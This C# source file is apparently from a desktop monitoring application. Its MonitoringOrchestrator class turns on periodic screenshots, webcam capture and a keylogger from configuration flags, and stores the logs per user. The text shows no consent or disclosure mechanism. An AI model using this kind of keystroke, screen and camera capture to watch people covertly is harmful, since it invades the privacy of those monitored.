using Apac.App.Database;

namespace Apac.App.Monitoring;

public class MonitoringOrchestrator : IDisposable
{
    private readonly DatabaseManager _db;
    private ScreenCapture? _screenCapture;
    private CameraCapture? _cameraCapture;
    private KeyLogger? _keyLogger;

    public MonitoringOrchestrator(DatabaseManager db)
    {
        _db = db;
    }

    public void StartAll(int? userId, string? username)
    {
        if (_db.GetConfig("screenshot_enabled") == "true")
        {
            var interval = int.TryParse(_db.GetConfig("screenshot_interval_sec", "60"), out var i) ? i : 60;
            var quality = _db.GetConfig("screenshot_quality", "Média");
            var path = _db.GetConfig("screenshot_path", Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs", "Screenshots"));
            _screenCapture = new ScreenCapture(_db, path, interval, quality);
            _screenCapture.SetUser(userId, username);
            _screenCapture.Start();
        }

        if (_db.GetConfig("camera_enabled") == "true")
        {
            var interval = int.TryParse(_db.GetConfig("camera_interval_sec", "120"), out var ci) ? ci : 120;
            var quality = _db.GetConfig("camera_quality", "Média");
            var path = _db.GetConfig("camera_path", Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs", "Camera"));
            _cameraCapture = new CameraCapture(_db, path, interval, quality);
            _cameraCapture.SetUser(userId, username);
            _cameraCapture.Start();
        }

        if (_db.GetConfig("keylogger_enabled") == "true")
        {
            var path = _db.GetConfig("keylogger_path", Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs", "Keylogs"));
            _keyLogger = new KeyLogger(_db, path, true);
            _keyLogger.Start(username ?? "sistema", userId);
        }
    }

    public void StopAll()
    {
        _screenCapture?.Stop();
        _cameraCapture?.Stop();
        _keyLogger?.Stop();
    }

    public void Dispose()
    {
        StopAll();
        _screenCapture?.Dispose();
        _cameraCapture?.Dispose();
        _keyLogger?.Dispose();
    }
}
